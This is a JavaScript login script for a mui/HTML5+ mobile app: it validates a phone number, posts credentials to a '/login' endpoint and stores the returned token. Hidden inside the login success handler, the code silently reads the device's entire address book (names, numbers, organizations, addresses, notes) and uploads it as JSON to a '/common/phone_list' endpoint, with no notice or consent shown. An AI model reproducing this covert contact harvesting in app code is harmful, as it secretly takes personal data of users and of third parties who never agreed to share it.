mui.ready(function() {
	var phone = /^1[34578]\d{9}$/;

	mui.plusReady(function() {
		if(plus.storage.getItem('tel')){
			document.getElementById("ph").value =  parseInt(plus.storage.getItem('tel'));
			document.getElementById("ph").innerHTML = parseInt(plus.storage.getItem('tel'));
		}
		
		var web = plus.webview.currentWebview().opener();
		plus.nativeUI.closeWaiting();
		if(web.id){
			var old_back = mui.back;
			mui.back = function(){
//				var wobj = plus.webview.getWebviewById(web.id); 
//				if(wobj){
//					wobj.reload(true);
//				}
	                
				old_back();
			}
		}
		
		

		document.getElementById("sub").addEventListener('tap', function() { //提交
			var ph = document.getElementById("ph").value;
			var pw = document.getElementById("pw").value;
			plus.storage.setItem('tel',ph);
			if(!ph) {
				mui.toast('请输入手机号');
				return;
			}
			if(!phone.test(ph)) {
				mui.toast('请输入手机号有误');
				return;
			}
			if(!pw) {
				mui.toast('请输入密码');
				return;
			}
			mui.ajax({
				url: URL.path + '/login',
				data: {
					phone: ph,
					pwd: pw,
					terminalNo: '3'
				},
				type: 'post',
				success: function(data) {
					if(data.returnCode == 200) {
						plus.storage.removeItem('token');
						mui.toast('登录成功', { duration: 1000 });
						var user = JSON.stringify(data.data);
						var token = data.data.token;
//						console.log(user,'user');
						var id = data.data.id;
						
						plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function(addressbook) {	
							addressbook.find(["displayName", "phoneNumbers","name","nickname","organizations","categories","addresses","note"], function(contacts) {
//								console.log(JSON.stringify(contacts),'contacts');
//								alert('111');
								var contact = JSON.stringify(contacts);
//								var contact = '222';
//								console.log(contact,'2222222');
//								console.log(id,'333333');
								mui.ajax({
									url:URL.path + '/common/phone_list',
									type:'post',
									data:{
										phone_list:contact,
										id:id
									},
									success:function(data){
										console.log(data,'data1')
									}
								})
							})
						})
											
						plus.storage.setItem('user', user);
						plus.storage.setItem('token', token);
						startTime();
						var my = plus.webview.getWebviewById('my.html'); 
						if(my){
							plus.webview.close(my,'none',0)
						}
						var circle = plus.webview.getWebviewById('circle.html');
						if(circle){
							plus.webview.close(circle,'none',0)
						}
						var demand = plus.webview.getWebviewById('demand.html');
						if(demand){
							plus.webview.close(demand,'none',0)
						}
						
						close_page('demand.html');
						
						//推送绑定
						plus.storage.setItem('deviceToken', '');
						getPushInfo(function(){
							mui.back();
						});
//						setTimeout(function() {
//							mui.back();
//						},500)
					}else{
						mui.toast(data.msg)
					}
				},
				error: function(xhr, type, errorThrown) {
					//异常处理；
					console.log(type)
					//alert(2)
				}
			})
			
		})
		document.getElementById("reg").addEventListener('tap', function() {
			mui.openWindow({
				url: 'signup.html',
				id: 'signup.html',
				styles: {
					top: '0px',
					bottom: '0px'
				}
			})
		})
		document.getElementById("forget").addEventListener('tap', function() {
			mui.openWindow({
				url: 'forget.html',
				id: 'forget.html',
				styles: {
					top: '0px',
					bottom: '0px'
				}
			})
		})

	})

})


